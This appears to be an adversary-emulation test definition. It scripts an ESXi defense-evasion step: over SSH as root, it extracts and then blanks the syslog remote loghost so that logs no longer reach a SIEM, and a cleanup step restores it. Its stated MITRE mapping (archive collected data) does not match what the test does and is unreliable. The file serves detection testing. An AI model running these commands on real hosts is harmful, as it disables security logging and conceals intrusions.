api_version: "2.0"
name: ESXi - Remove Syslog remote IP
description: |
    An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.
args:
    - name: vm_host
      type: string
      default: atomic.local
    - name: plink_file
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
    - name: username
      type: string
      default: root
    - name: password
      type: string
      default: n/a
uuid: 36c62584-d360-41d6-886f-d194654be7c2
mitre:
    tactics:
        - 'TA0009: Collection'
    techniques:
        - 'T1560: Archive Collected Data'
    subtechniques:
        - 'T1560.001: Archive via Utility'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        The plink executable must be found in the ExternalPayloads folder.
      inline: |
        if (Test-Path "#{plink_file}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
        }}
      executor: powershell
    - name: esxi---remove-syslog-remote-ip
      inline: "# Extract line with IP address from the syslog configuration output\n{{.Args.plink_file}} -ssh {{.Args.vm_host}} -l {{.Args.username}} -pw {{.Args.password}} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\n{{.Args.plink_file}} -ssh {{.Args.vm_host}} -l {{.Args.username}} -pw {{.Args.password}} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n    Write-Host \"The content is $fileContent\"\n    Write-Host \"The file is empty\"\n} else {\n    # Use a regular expression to extract IP addresses\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n    \n    $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\n    \n    Write-Host \"IP addresses extracted and saved to $outputFilePath\"\n}\n"
      executor: powershell
      cleanup:
        inline: |
            # Re-add the initially extracted IP
            {{.Args.plink_file}} -ssh {{.Args.vm_host}} -l {{.Args.username}} -pw {{.Args.password}} -m c:\temp\loghost_ip.txt

            rm c:\temp\loghost_ip.txt
            rm c:\temp\loghost.txt
        executor: powershell
